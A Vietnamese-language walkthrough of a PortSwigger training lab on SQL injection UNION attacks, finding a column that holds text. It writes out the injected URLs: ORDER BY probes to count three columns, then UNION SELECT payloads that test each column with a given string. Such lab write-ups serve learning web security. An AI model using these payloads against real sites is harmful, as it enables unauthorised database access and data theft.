# Lab: SQL injection UNION attack, finding a column containing text

### Link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
![Require of Lab](/Images/sql4.1.png)

Yêu cầu của bài lab là trả về các giá trị của cột tương thích với chuỗi cho trước

Truy cập vào bài lab ta thấy đây là 1 website bán hàng, với từng danh mục như `Corporate gifts`, `Gifts` và `Lifestyle`,.... và chuỗi cho trước là  **tzIxmH**

![Website](/Images/sql4.2.png)

Để hoàn thành bài lab, ta làm các bước tương tự như ở bài lab trước là xác định số cột được trả về, tiếp theo là tìm ra cột tương thích với chuỗi được cho sẵn

Bắt đầu với việc tìm ra số cột được trả về, ta thay đổi URL bằng cách thêm vào chuỗi như sau `'+ORDER+BY+2--`
> https://ac461f0d1e4cd530c0a4fc1f00dd006b.web-security-academy.net/filter?category=Gifts'+ORDER+BY+2--

![Product of Pets order by 2](/Images/sql4.3.png)
Tiếp tục phép thử bằng cách thay đổi vị trí tương đối là 3 và 4. Ở lần tăng thành 4 thì xuất hiện thông báo lỗi
> https://ac461f0d1e4cd530c0a4fc1f00dd006b.web-security-academy.net/filter?category=Gifts'+ORDER+BY+4--

![Product of Pets order by 4](/Images/sql4.4.png)

Từ đó xác định được số cột được trả về là 3.

Sau khi xác định được số cột được trả về, ta sử dụng phương pháp UNION SELECT để thăm dò từng cột có chứa chuỗi cho trước hay không bằng cách thay đổi URL bằng cách đặt lần lượt giá trị chuỗi vào mỗi cột như sau

- UNION SELECT 'tzIxmH',NULL,NULL--

- UNION SELECT NULL,'tzIxmH',NULL--

- UNION SELECT NULL,NULL,'tzIxmH'--

Đầu tiên đặt giá trị chuỗi vào cột thứ nhất, ta thay đổi URL như sau:
> https://ac461f0d1e4cd530c0a4fc1f00dd006b.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+'tzIxmH',NULL,NULL--

![Test](/Images/sql4.5.png)
Tiếp theo, đặt giá trị chuỗi vào cột thứ 2 và nhận được kết quả

> https://ac461f0d1e4cd530c0a4fc1f00dd006b.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+NULL,'tzIxmH',NULL--
 
![Result](/Images/sql4.6.png)


<div align="right"> <i> Ngày 21 tháng 01 năm 2021 </i> </div>
